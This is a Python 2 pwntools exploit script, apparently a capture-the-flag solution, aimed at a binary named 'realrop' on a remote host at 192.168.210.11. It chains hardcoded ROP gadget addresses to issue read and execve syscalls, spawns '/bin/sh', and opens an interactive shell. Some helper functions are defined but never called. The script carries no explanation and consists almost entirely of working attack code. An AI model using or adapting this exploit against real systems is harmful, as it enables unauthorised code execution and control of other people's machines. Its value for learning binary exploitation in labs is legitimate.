# -*- coding: utf-8 -*-

from pwn import *
import time

pwnable_filename = "./realrop"
pwnable = ELF(pwnable_filename)

Io = remote("192.168.210.11", 10011)
# Io = process(pwnable_filename)

# gdb.attach(proc.pidof(Io)[0], gdbscript='b *0x080480FD\nc')

output_addr = 0x08048115
input_addr = 0x080480FD
start_addr = 0x080480B8
base_addr = 0x08048000

stack_addr = 0xff928000

add_esp_20_ret_addr = 0x08048198
set_ebcdx_addr = 0x0804811A

stdout = 0x01
stdin = 0x00

junk_size = 0x10
junk = "LLLLMMMMNNNNOOOO"

read_id = 0x03
write_id = 0x04
execve_id = 0x0b


def read(addr, size, return_addr):
    Io.read()
    payload = flat([
        junk,
        output_addr,
        return_addr,
        p32(stdout),
        p32(addr),
        p32(size),
    ])
    Io.sendline(payload)
    Io.readuntil("Good Luck!\n")
    data = Io.read(size)
    print "[+] 0x%08x => %r" % (addr, data)
    return data


def write(addr, data, size):
    Io.read()
    payload = flat([
        junk,
        input_addr,
        start_addr,
        p32(stdin),
        p32(addr),
        p32(size),
    ])
    Io.sendline(payload)
    Io.sendline(data[0:size])


def syscall(eax, ebx, ecx, edx):
    payload = flat([
        junk,
        p32(output_addr),
        p32(add_esp_20_ret_addr),
        p32(stdout),
        p32(base_addr),
        p32(eax),
        "A" * 20,
        p32(set_ebcdx_addr),
        p32(start_addr),
        p32(ebx),
        p32(ecx),
        p32(edx),
    ])
    print "[+] Payload: %r" % (payload)
    Io.sendline(payload)


# # write(stdout, base_addr, 0x08)
# syscall(write_id, stdout, base_addr, 0x08)

# read(stdin, stack_addr, 0x08)
# syscall(read_id, stdin, stack_addr, 0x28)

# # execve_id(stack_addr, 0, 0)
# syscall(execve_id, stack_addr + 0x20 + 1, 0, 0)
def exploit():
    payload = flat([
        junk,
        ##########################
        # read /bin/sh to memory #
        ##########################
        p32(output_addr),
        p32(add_esp_20_ret_addr),
        p32(stdout),
        p32(base_addr),
        p32(read_id),
        "GGGGHHHHIIIIJJJJKKKK",
        # set ebcdx
        p32(set_ebcdx_addr),
        p32(add_esp_20_ret_addr),
        p32(stdin),  # ebx
        p32(stack_addr),  # ecx
        p32(0x28),  # edx
        "AAAABBBBCCCCDDDDEEEE",
        ########################
        # set eax -> execve_id #
        ########################
        p32(output_addr),
        p32(add_esp_20_ret_addr),
        p32(stdout),
        p32(base_addr),
        p32(execve_id),
        "QQQQRRRRSSSS" + "/bin/sh\x00",
        # set ebcdx
        p32(set_ebcdx_addr),
        p32(start_addr),
        p32(stack_addr + 0x20 + 1),  # ebx
        p32(0),  # ecx
        p32(0),  # edx
    ])
    print "[+] Payload: %r" % (payload)
    Io.sendline(payload)


payload = flat([
    junk,
    p32(input_addr),
    p32(add_esp_20_ret_addr),
    p32(stdin),
    p32(stack_addr),
    p32(execve_id),
    "GGGGHHHHIIIIJJJJKKKK",
    p32(set_ebcdx_addr),
    p32(0xFFFFFFFF),
    p32(stack_addr),
    p32(0),
    p32(0),
])

Io.sendline(payload)
time.sleep(1)
Io.sendline("/bin////sh\x00")
Io.interactive()
